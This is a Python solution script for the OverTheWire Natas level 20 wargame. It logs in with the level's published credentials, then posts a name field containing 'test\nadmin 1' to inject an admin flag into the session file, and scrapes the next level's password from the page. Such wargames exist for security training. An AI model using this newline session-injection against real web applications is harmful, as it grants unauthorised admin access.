#!/usr/bin/env python3

import requests
import re
import string
from time import *

req = requests.Session()

s= string.ascii_letters+string.digits

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = "http://%s.natas.labs.overthewire.org/" % username

req_get = req.get(url+"index.php",auth=(username,password))
req_get = req.post(url+"index.php",data={"name":"test\nadmin 1"},auth=(username,password))
req_get = req.get(url+"index.php",auth=(username,password))
# print(req_get.text)

new_password = re.findall("Password: (.*)</pre>",req_get.text)
print(new_password[0])
